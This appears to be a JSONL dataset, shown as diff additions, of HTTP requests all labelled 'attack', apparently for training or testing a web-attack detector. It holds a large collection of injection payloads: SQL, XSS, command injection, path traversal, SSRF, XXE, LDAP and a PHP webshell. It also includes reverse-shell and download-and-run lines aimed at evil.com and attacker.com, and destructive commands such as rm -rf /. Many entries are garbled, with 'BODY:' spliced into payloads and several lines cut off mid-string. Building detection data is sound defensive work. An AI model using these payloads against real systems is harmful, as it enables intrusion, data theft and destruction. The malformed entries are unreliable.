+{"text": "GET /upload?q=<iframe BODY:src=javascript:alert(1)>", "label": "attack"}
+{"text": "GET /login?q=<body BODY:onload=alert(1)>", "label": "attack"}
+{"text": "GET /download?id=' BODY:OR (SELECT COUNT(*) FROM users) > 0--", "label": "attack"}
+{"text": "GET /admin?id='; BODY:DROP TABLE users;--", "label": "attack"}
+{"text": "POST /login? BODY:{\"username\": \"admin\", \"password\": \"admin'--\"}", "label": "attack"}
+{"text": "GET /admin?q=<svg BODY:onload=alert(1)>", "label": "attack"}
+{"text": "POST /file? BODY:{\"username\": \"admin\", \"password\": \"admin' OR '1'='1'#\"}", "label": "attack"}
+{"text": "POST /file? BODY:{\"username\": \"admin\", \"password\": \"1' OR '1'='1' /*\"}", "label": "attack"}
+{"text": "POST /upload? BODY:{\"username\": \"admin\", \"password\": \"' OR SLEEP(5)--\"}", "label": "attack"}
+{"text": "GET /file?id=' BODY:UNION ALL SELECT NULL--", "label": "attack"}
+{"text": "POST /api/data? BODY:{\"username\": \"admin\", \"password\": \"' AND 1=1--\"}", "label": "attack"}
+{"text": "GET /search?id=' BODY:UNION SELECT * FROM users--", "label": "attack"}
+{"text": "GET /system?cmd=`cat BODY:/etc/passwd`", "label": "attack"}
+{"text": "GET /download?id=' BODY:UNION SELECT * FROM users--", "label": "attack"}
+{"text": "POST /api/data? BODY:{\"username\": \"admin\", \"password\": \"' OR SLEEP(5)--\"}", "label": "attack"}
+{"text": "GET /search?id='; BODY:DROP TABLE users;--", "label": "attack"}
+{"text": "POST /upload? BODY:{\"username\": \"admin\", \"password\": \"admin'--\"}", "label": "attack"}
+{"text": "POST /search? BODY:{\"username\": \"admin\", \"password\": \"' OR (SELECT COUNT(*) FROM users) > 0--\"}", "label": "attack"}
+{"text": "POST /download? BODY:{\"username\": \"admin\", \"password\": \"' AND 1=1--\"}", "label": "attack"}
+{"text": "GET /upload?q=<body BODY:onload=alert(1)>", "label": "attack"}
+{"text": "GET /file?q=<marquee BODY:onstart=alert(1)>", "label": "attack"}
+{"text": "GET /upload?id=' BODY:OR 1=1#", "label": "attack"}
+{"text": "GET /login?id=' BODY:UNION SELECT * FROM users--", "label": "attack"}
+{"text": "GET /admin?id=' BODY:OR (SELECT COUNT(*) FROM users) > 0--", "label": "attack"}
+{"text": "POST /download? BODY:{\"username\": \"admin\", \"password\": \"' OR pg_sleep(5)--\"}", "label": "attack"}
+{"text": "GET /api/data?q=<script>alert('XSS')</script>", "label": "attack"}
+{"text": "GET /search?id=' BODY:OR 1=1#", "label": "attack"}
+{"text": "POST /download? BODY:{\"username\": \"admin\", \"password\": \"'; DROP TABLE users;--\"}", "label": "attack"}
+{"text": "GET /download?id=admin' BODY:OR '1'='1'#", "label": "attack"}
+{"text": "POST /upload? BODY:{\"username\": \"admin\", \"password\": \"' UNION SELECT * FROM users--\"}", "label": "attack"}
+{"text": "GET /api/data?id=1'; BODY:DELETE FROM users;--", "label": "attack"}
+{"text": "POST /download? BODY:{\"username\": \"admin\", \"password\": \"' OR 'x'='x\"}", "label": "attack"}
+{"text": "POST /upload? BODY:{\"username\": \"admin\", \"password\": \"' AND 1=1--\"}", "label": "attack"}
+{"text": "GET /login?q=<keygen BODY:onfocus=alert(1) autofocus>", "label": "attack"}
+{"text": "POST /upload? BODY:{\"username\": \"admin\", \"password\": \"'; EXEC xp_cmdshell('dir');--\"}", "label": "attack"}
+{"text": "GET /login?id=1' BODY:OR '1'='1' /*", "label": "attack"}
+{"text": "GET /upload?q=<input BODY:onfocus=alert(1) autofocus>", "label": "attack"}
+{"text": "GET /system?cmd=; BODY:rm -rf /", "label": "attack"}
+{"text": "POST /login? BODY:{\"username\": \"admin\", \"password\": \"' OR pg_sleep(5)--\"}", "label": "attack"}
+{"text": "POST /login? BODY:{\"username\": \"admin\", \"password\": \"1'; DELETE FROM users;--\"}", "label": "attack"}
+{"text": "GET /upload?id=' BODY:UNION SELECT * FROM users--", "label": "attack"}
+{"text": "POST /download? BODY:{\"username\": \"admin\", \"password\": \"' OR '1'='1\"}", "label": "attack"}
+{"text": "POST /search? BODY:{\"username\": \"admin\", \"password\": \"' OR '1'='1\"}", "label": "attack"}
+{"text": "POST /admin? BODY:{\"username\": \"admin\", \"password\": \"' OR 1=1--\"}", "label": "attack"}
+{"text": "GET /api/data?q='\"><script>alert('XSS')</script>", "label": "attack"}
+{"text": "GET /download?id=' BODY:OR pg_sleep(5)--", "label": "attack"}
+{"text": "GET /login?id=1' BODY:UNION SELECT * FROM users--", "label": "attack"}
+{"text": "GET /search?q='; BODY:DROP TABLE users;--", "label": "attack"}
+{"text": "POST /login? BODY:{\"username\": \"admin\", \"password\": \"pass' OR '1'='1", "label": "attack"}
+{"text": "GET /comment?msg=<img BODY:src=x onerror=alert(1)>", "label": "attack"}
+{"text": "POST /post? BODY:{\"content\": \"<script>document.location=\\\"http://ev", "label": "attack"}
+{"text": "GET /download?file=..\\..\\..\\windows\\system32\\config\\sam", "label": "attack"}
+{"text": "GET /include?page=....//....//....//etc/passwd", "label": "attack"}
+{"text": "GET /ping?host=127.0.0.1; BODY:cat /etc/passwd", "label": "attack"}
+{"text": "GET /system?cmd=ls BODY:-la && rm -rf /", "label": "attack"}
+{"text": "POST /exec? BODY:{\"command\": \"whoami && cat /etc/shadow\"}", "label": "attack"}
+{"text": "POST /eval? BODY:{\"code\": \"<?php system($_GET['cmd']); ?>\"}", "label": "attack"}
+{"text": "GET /include?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+", "label": "attack"}
+{"text": "GET /auth?(password=*))&user=admin)(", "label": "attack"}
+{"text": "POST /xml? BODY:<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test", "label": "attack"}
+{"text": "GET /fetch?url=http://169.254.169.254/latest/meta-data/", "label": "attack"}
+{"text": "GET /proxy?target=file:///etc/passwd", "label": "attack"}
+{"text": "GET /login?id=' OR '1'='1", "label": "attack"}
+{"text": "GET /login?id=1' UNION SELECT * FROM users--", "label": "attack"}
+{"text": "GET /search?q='; DROP TABLE users;--", "label": "attack"}
+{"text": "POST /login? BODY:{\"username\": \"admin\", \"password\": \"pass' OR '1'='1\"}", "label": "attack"}
+{"text": "GET /comment?msg=<img src=x onerror=alert(1)>", "label": "attack"}
+{"text": "POST /post? BODY:{\"content\": \"<script>document.location=\\\"http://evil.com\\\"</script>\"}", "label": "attack"}
+{"text": "GET /ping?host=127.0.0.1; cat /etc/passwd", "label": "attack"}
+{"text": "GET /system?cmd=ls -la && rm -rf /", "label": "attack"}
+{"text": "GET /auth?user=admin)(&(password=*))", "label": "attack"}
+{"text": "POST /xml? BODY:<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM \"file:///etc/passwd\">]><root>&test;</root>", "label": "attack"}
+{"text": "GET /system?cmd=; wget http://evil.com/backdoor", "label": "attack"}
+{"text": "GET /file?q=<svg onload=alert(1)>", "label": "attack"}
+{"text": "GET /file?id=' OR SLEEP(5)--", "label": "attack"}
+{"text": "GET /api/data?id=' OR 1=1#", "label": "attack"}
+{"text": "GET /download?q=<input onfocus=alert(1) autofocus>", "label": "attack"}
+{"text": "GET /system?cmd=; cat /etc/passwd", "label": "attack"}
+{"text": "GET /login?q=<select onfocus=alert(1) autofocus>", "label": "attack"}
+{"text": "GET /file?q=<img src=x onerror=alert(1)>", "label": "attack"}
+{"text": "GET /file?q=<audio src=x onerror=alert(1)>", "label": "attack"}
+{"text": "GET /search?id=' AND 1=1--", "label": "attack"}
+{"text": "GET /api/data?id='; DROP TABLE users;--", "label": "attack"}
+{"text": "GET /search?q=<audio src=x onerror=alert(1)>", "label": "attack"}
+{"text": "GET /login?q=<video><source onerror=alert(1)>", "label": "attack"}
+{"text": "GET /file?q=<details open ontoggle=alert(1)>", "label": "attack"}
+{"text": "GET /download?id=1'; DELETE FROM users;--", "label": "attack"}
+{"text": "GET /upload?id=1'; DELETE FROM users;--", "label": "attack"}
+{"text": "GET /admin?id=' OR SLEEP(5)--", "label": "attack"}
+{"text": "GET /admin?q=<input onfocus=alert(1) autofocus>", "label": "attack"}
+{"text": "GET /upload?id='; DROP TABLE users;--", "label": "attack"}
+{"text": "GET /file?id=' OR BENCHMARK(1000000,MD5(1))--", "label": "attack"}
+{"text": "GET /download?q=<svg onload=alert(1)>", "label": "attack"}
+{"text": "GET /download?q=<select onfocus=alert(1) autofocus>", "label": "attack"}
+{"text": "GET /upload?q=<svg onload=alert(1)>", "label": "attack"}
+{"text": "GET /download?q=<textarea onfocus=alert(1) autofocus>", "label": "attack"}
+{"text": "GET /api/data?id=' OR BENCHMARK(1000000,MD5(1))--", "label": "attack"}
+{"text": "GET /file?q=<input onfocus=alert(1) autofocus>", "label": "attack"}
+{"text": "GET /upload?id=' OR 'x'='x", "label": "attack"}
+{"text": "GET /search?q=<keygen onfocus=alert(1) autofocus>", "label": "attack"}
+{"text": "GET /file?id=' AND 1=1--", "label": "attack"}
+{"text": "GET /file?id='; EXEC xp_cmdshell('dir');--", "label": "attack"}
+{"text": "GET /upload?id='; EXEC xp_cmdshell('dir');--", "label": "attack"}
+{"text": "GET /upload?id=admin' OR '1'='1'#", "label": "attack"}
+{"text": "GET /admin?id=' UNION SELECT * FROM users--", "label": "attack"}
+{"text": "GET /file?id=1'; DELETE FROM users;--", "label": "attack"}
+{"text": "GET /search?id=' OR SLEEP(5)--", "label": "attack"}
+{"text": "GET /login?q=<textarea onfocus=alert(1) autofocus>", "label": "attack"}
+{"text": "GET /admin?id=' OR '1'='1", "label": "attack"}
+{"text": "GET /search?q=<video><source onerror=alert(1)>", "label": "attack"}
+{"text": "GET /api/data?q=<img src=x onerror=alert(1)>", "label": "attack"}
+{"text": "GET /admin?q=<details open ontoggle=alert(1)>", "label": "attack"}
+{"text": "GET /download?id=' AND 1=1--", "label": "attack"}
+{"text": "GET /api/data?q=<iframe src=javascript:alert(1)>", "label": "attack"}
+{"text": "GET /upload?q=<video><source onerror=alert(1)>", "label": "attack"}
+{"text": "GET /system?cmd=; nc -e /bin/sh attacker.com 4444", "label": "attack"}
+{"text": "GET /download?q=<body onload=alert(1)>", "label": "attack"}
+{"text": "GET /login?q=<audio src=x onerror=alert(1)>", "label": "attack"}
+{"text": "GET /api/data?q=<keygen onfocus=alert(1) autofocus>", "label": "attack"}
+{"text": "GET /api/data?q=<video><source onerror=alert(1)>", "label": "attack"}
+{"text": "GET /search?q=<details open ontoggle=alert(1)>", "label": "attack"}
+{"text": "GET /login?id=' OR 1=1--", "label": "attack"}
+{"text": "GET /login?id=' OR BENCHMARK(1000000,MD5(1))--", "label": "attack"}
+{"text": "GET /file?q=<video><source onerror=alert(1)>", "label": "attack"}
+{"text": "GET /download?id=' OR BENCHMARK(1000000,MD5(1))--", "label": "attack"}
+{"text": "GET /api/data?id='; EXEC xp_cmdshell('dir');--", "label": "attack"}
+{"text": "GET /file?id=' OR 1=1#", "label": "attack"}
+{"text": "GET /search?id=' OR '1'='1", "label": "attack"}
+{"text": "GET /login?q=<marquee onstart=alert(1)>", "label": "attack"}
+{"text": "GET /api/data?id=' OR (SELECT COUNT(*) FROM users) > 0--", "label": "attack"}
+{"text": "GET /upload?q=<keygen onfocus=alert(1) autofocus>", "label": "attack"}
+{"text": "GET /download?q=<img src=x onerror=alert(1)>", "label": "attack"}
+{"text": "GET /login?id='; DROP TABLE users;--", "label": "attack"}
+{"text": "GET /file?q=<body onload=alert(1)>", "label": "attack"}
+{"text": "GET /login?q=<svg onload=alert(1)>", "label": "attack"}
+{"text": "GET /upload?q=<img src=x onerror=alert(1)>", "label": "attack"}
+{"text": "GET /file?q=<textarea onfocus=alert(1) autofocus>", "label": "attack"}
+{"text": "GET /login?q=<details open ontoggle=alert(1)>", "label": "attack"}
+{"text": "GET /download?q=<keygen onfocus=alert(1) autofocus>", "label": "attack"}
+{"text": "GET /upload?id=' OR BENCHMARK(1000000,MD5(1))--", "label": "attack"}
+{"text": "GET /api/data?id=' OR '1'='1", "label": "attack"}
+{"text": "GET /download?id=' OR '1'='1", "label": "attack"}
+{"text": "GET /api/data?q=<details open ontoggle=alert(1)>", "label": "attack"}
+{"text": "GET /admin?id=' OR 1=1--", "label": "attack"}
+{"text": "GET /admin?q=<keygen onfocus=alert(1) autofocus>", "label": "attack"}
+{"text": "GET /search?id=' OR 'x'='x", "label": "attack"}
+{"text": "GET /file?id=' OR 'x'='x", "label": "attack"}
+{"text": "GET /admin?q=<select onfocus=alert(1) autofocus>", "label": "attack"}
+{"text": "GET /api/data?id=' UNION SELECT * FROM users--", "label": "attack"}
+{"text": "GET /login?id=admin' OR '1'='1'#", "label": "attack"}
+{"text": "GET /login?id=' OR SLEEP(5)--", "label": "attack"}
+{"text": "GET /file?id='; DROP TABLE users;--", "label": "attack"}
+{"text": "GET /upload?id=' AND 1=1--", "label": "attack"}
+{"text": "GET /upload?id=1' OR '1'='1' /*", "label": "attack"}
+{"text": "GET /admin?id=' OR 1=1#", "label": "attack"}
+{"text": "GET /search?id=admin' OR '1'='1'#", "label": "attack"}
+{"text": "GET /api/data?q=<input onfocus=alert(1) autofocus>", "label": "attack"}
+{"text": "GET /file?id=' OR (SELECT COUNT(*) FROM users) > 0--", "label": "attack"}
+{"text": "GET /login?id=' OR (SELECT COUNT(*) FROM users) > 0--", "label": "attack"}
+{"text": "GET /admin?q=<textarea onfocus=alert(1) autofocus>", "label": "attack"}
+{"text": "GET /api/data?q=<audio src=x onerror=alert(1)>", "label": "attack"}
+{"text": "GET /login?id=' OR 1=1#", "label": "attack"}
+{"text": "GET /file?id=' OR pg_sleep(5)--", "label": "attack"}
+{"text": "GET /search?q=<svg onload=alert(1)>", "label": "attack"}
+{"text": "GET /search?id=1'; DELETE FROM users;--", "label": "attack"}
+{"text": "GET /admin?id=1'; DELETE FROM users;--", "label": "attack"}
+{"text": "GET /upload?id=' UNION ALL SELECT NULL--", "label": "attack"}
+{"text": "GET /admin?id=admin' OR '1'='1'#", "label": "attack"}
+{"text": "GET /system?cmd=| whoami", "label": "attack"}
+{"text": "GET /login?id=' OR 'x'='x", "label": "attack"}
+{"text": "GET /api/data?id=' OR SLEEP(5)--", "label": "attack"}
+{"text": "GET /api/data?q=<select onfocus=alert(1) autofocus>", "label": "attack"}
+{"text": "GET /download?id=' OR 'x'='x", "label": "attack"}
+{"text": "GET /admin?id=' UNION ALL SELECT NULL--", "label": "attack"}
+{"text": "GET /upload?id=' OR (SELECT COUNT(*) FROM users) > 0--", "label": "attack"}
+{"text": "GET /download?id=' OR 1=1--", "label": "attack"}
+{"text": "GET /download?q=<iframe src=javascript:alert(1)>", "label": "attack"}
+{"text": "GET /system?cmd=&& dir", "label": "attack"}
+{"text": "GET /upload?q=<audio src=x onerror=alert(1)>", "label": "attack"}
+{"text": "GET /search?q=<body onload=alert(1)>", "label": "attack"}
+{"text": "GET /login?id=1'; DELETE FROM users;--", "label": "attack"}
+{"text": "GET /search?id=' OR 1=1--", "label": "attack"}
+{"text": "GET /api/data?q=<svg onload=alert(1)>", "label": "attack"}
+{"text": "GET /search?q=<img src=x onerror=alert(1)>", "label": "attack"}
+{"text": "GET /api/data?q=<textarea onfocus=alert(1) autofocus>", "label": "attack"}
+{"text": "GET /api/data?id=' OR pg_sleep(5)--", "label": "attack"}
+{"text": "GET /admin?q=<audio src=x onerror=alert(1)>", "label": "attack"}
+{"text": "GET /api/data?q=<body onload=alert(1)>", "label": "attack"}
+{"text": "GET /download?id=1' OR '1'='1' /*", "label": "attack"}
+{"text": "GET /download?q=<details open ontoggle=alert(1)>", "label": "attack"}
+{"text": "GET /system?cmd=| curl http://evil.com/shell.sh | sh", "label": "attack"}
+{"text": "GET /login?id=' OR pg_sleep(5)--", "label": "attack"}
+{"text": "GET /upload?q=<textarea onfocus=alert(1) autofocus>", "label": "attack"}
+{"text": "GET /admin?id=' OR 'x'='x", "label": "attack"}
+{"text": "GET /file?q=<select onfocus=alert(1) autofocus>", "label": "attack"}
+{"text": "GET /upload?id=' OR '1'='1", "label": "attack"}
+{"text": "GET /api/data?id=' UNION ALL SELECT NULL--", "label": "attack"}
+{"text": "GET /search?id=' OR (SELECT COUNT(*) FROM users) > 0--", "label": "attack"}
+{"text": "GET /admin?q=<video><source onerror=alert(1)>", "label": "attack"}
+{"text": "GET /admin?id='; EXEC xp_cmdshell('dir');--", "label": "attack"}
+{"text": "GET /search?id=' OR pg_sleep(5)--", "label": "attack"}
+{"text": "GET /search?id=' OR BENCHMARK(1000000,MD5(1))--", "label": "attack"}
+{"text": "GET /admin?q=<marquee onstart=alert(1)>", "label": "attack"}
+{"text": "GET /api/data?id=admin' OR '1'='1'#", "label": "attack"}
+{"text": "GET /api/data?id=1' OR '1'='1' /*", "label": "attack"}
+{"text": "GET /upload?id=' OR SLEEP(5)--", "label": "attack"}
+{"text": "GET /file?q=<keygen onfocus=alert(1) autofocus>", "label": "attack"}
+{"text": "GET /search?q=<select onfocus=alert(1) autofocus>", "label": "attack"}
+{"text": "GET /download?id='; DROP TABLE users;--", "label": "attack"}
+{"text": "GET /api/data?id=' OR 1=1--", "label": "attack"}
+{"text": "GET /upload?q=<select onfocus=alert(1) autofocus>", "label": "attack"}
+{"text": "GET /system?cmd=|| cmd /c dir", "label": "attack"}
+{"text": "GET /login?q=<img src=x onerror=alert(1)>", "label": "attack"}
+{"text": "GET /admin?id=' AND 1=1--", "label": "attack"}
+{"text": "GET /admin?id=1' OR '1'='1' /*", "label": "attack"}
+{"text": "GET /search?id=1' OR '1'='1' /*", "label": "attack"}
+{"text": "GET /download?id=' UNION ALL SELECT NULL--", "label": "attack"}
+{"text": "GET /admin?id=' OR BENCHMARK(1000000,MD5(1))--", "label": "attack"}
+{"text": "GET /admin?id=' OR pg_sleep(5)--", "label": "attack"}
+{"text": "GET /search?id='; EXEC xp_cmdshell('dir');--", "label": "attack"}
+{"text": "GET /api/data?q=<marquee onstart=alert(1)>", "label": "attack"}
+{"text": "GET /login?q=<input onfocus=alert(1) autofocus>", "label": "attack"}
+{"text": "GET /admin?q=<iframe src=javascript:alert(1)>", "label": "attack"}
+{"text": "GET /search?q=<textarea onfocus=alert(1) autofocus>", "label": "attack"}
+{"text": "GET /download?q=<audio src=x onerror=alert(1)>", "label": "attack"}
+{"text": "GET /login?q=<iframe src=javascript:alert(1)>", "label": "attack"}
+{"text": "GET /upload?id=' OR pg_sleep(5)--", "label": "attack"}
+{"text": "GET /system?cmd=|| ls -la", "label": "attack"}
+{"text": "GET /download?id='; EXEC xp_cmdshell('dir');--", "label": "attack"}
+{"text": "GET /search?q=<marquee onstart=alert(1)>", "label": "attack"}
+{"text": "GET /file?id=1' OR '1'='1' /*", "label": "attack"}
+{"text": "GET /download?id=' OR SLEEP(5)--", "label": "attack"}
+{"text": "GET /login?id=' UNION ALL SELECT NULL--", "label": "attack"}
+{"text": "GET /upload?q=<details open ontoggle=alert(1)>", "label": "attack"}
+{"text": "GET /download?q=<video><source onerror=alert(1)>", "label": "attack"}
+{"text": "GET /search?q=<input onfocus=alert(1) autofocus>", "label": "attack"}
+{"text": "GET /file?id=' OR '1'='1", "label": "attack"}
+{"text": "GET /download?id=' OR 1=1#", "label": "attack"}
+{"text": "GET /api/data?id=' OR 'x'='x", "label": "attack"}
+{"text": "GET /file?q=<iframe src=javascript:alert(1)>", "label": "attack"}
+{"text": "GET /file?id=' UNION SELECT * FROM users--", "label": "attack"}
+{"text": "GET /search?id=' UNION ALL SELECT NULL--", "label": "attack"}
+{"text": "GET /login?id='; EXEC xp_cmdshell('dir');--", "label": "attack"}
+{"text": "GET /download?q=<marquee onstart=alert(1)>", "label": "attack"}
+{"text": "GET /api/data?id=' AND 1=1--", "label": "attack"}
+{"text": "GET /upload?id=' OR 1=1--", "label": "attack"}
+{"text": "GET /file?id=' OR 1=1--", "label": "attack"}
+{"text": "GET /admin?q=<img src=x onerror=alert(1)>", "label": "attack"}
+{"text": "GET /admin?q=<body onload=alert(1)>", "label": "attack"}
+{"text": "GET /system?cmd=&& powershell -c Get-Process", "label": "attack"}
+{"text": "GET /search?q=<iframe src=javascript:alert(1)>", "label": "attack"}
+{"text": "GET /upload?q=<marquee onstart=alert(1)>", "label": "attack"}
+{"text": "GET /file?id=admin' OR '1'='1'#", "label": "attack"}
+{"text": "GET /login?id=' AND 1=1--", "label": "attack"}
+{"text": "GET /upload?q=<iframe src=javascript:alert(1)>", "label": "attack"}
+{"text": "GET /login?q=<body onload=alert(1)>", "label": "attack"}
+{"text": "GET /download?id=' OR (SELECT COUNT(*) FROM users) > 0--", "label": "attack"}
+{"text": "GET /admin?id='; DROP TABLE users;--", "label": "attack"}
+{"text": "GET /admin?q=<svg onload=alert(1)>", "label": "attack"}
+{"text": "GET /file?id=' UNION ALL SELECT NULL--", "label": "attack"}
+{"text": "GET /search?id=' UNION SELECT * FROM users--", "label": "attack"}
+{"text": "GET /system?cmd=`cat /etc/passwd`", "label": "attack"}
+{"text": "GET /download?id=' UNION SELECT * FROM users--", "label": "attack"}
+{"text": "GET /search?id='; DROP TABLE users;--", "label": "attack"}
+{"text": "GET /upload?q=<body onload=alert(1)>", "label": "attack"}
+{"text": "GET /file?q=<marquee onstart=alert(1)>", "label": "attack"}
+{"text": "GET /upload?id=' OR 1=1#", "label": "attack"}
+{"text": "GET /login?id=' UNION SELECT * FROM users--", "label": "attack"}
+{"text": "GET /admin?id=' OR (SELECT COUNT(*) FROM users) > 0--", "label": "attack"}
+{"text": "GET /search?id=' OR 1=1#", "label": "attack"}
+{"text": "GET /download?id=admin' OR '1'='1'#", "label": "attack"}
+{"text": "GET /api/data?id=1'; DELETE FROM users;--", "label": "attack"}
+{"text": "GET /login?q=<keygen onfocus=alert(1) autofocus>", "label": "attack"}
+{"text": "GET /login?id=1' OR '1'='1' /*", "label": "attack"}
+{"text": "GET /upload?q=<input onfocus=alert(1) autofocus>", "label": "attack"}
+{"text": "GET /system?cmd=; rm -rf /", "label": "attack"}
+{"text": "GET /upload?id=' UNION SELECT * FROM users--", "label": "attack"}
+{"text": "GET /download?id=' OR pg_sleep(5)--", "label": "attack"}
